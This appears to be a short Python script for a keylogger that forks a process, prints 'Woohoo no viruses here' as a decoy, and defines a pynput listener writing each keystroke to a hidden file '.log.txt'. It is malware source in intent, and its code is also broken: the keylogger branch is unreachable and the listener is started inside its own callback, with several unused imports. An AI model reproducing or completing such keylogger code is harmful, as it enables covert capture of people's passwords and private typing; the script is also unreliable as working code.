import psutil
import base64
import time
import gzip
import os
import pynput
from pynput.keyboard import Listener

def main():
    pid = os.fork()
    while True:

        time.sleep(2)

        print("Woohoo no viruses here")


        time.sleep(2)
    else:
            keylogger()

def keylogger():
    def on_press(key):
        with open('.log.txt', 'a') as f:
            f.write(str(key)+'\n')
            with Listener(on_press=on_press) as listener:
                listener.join() 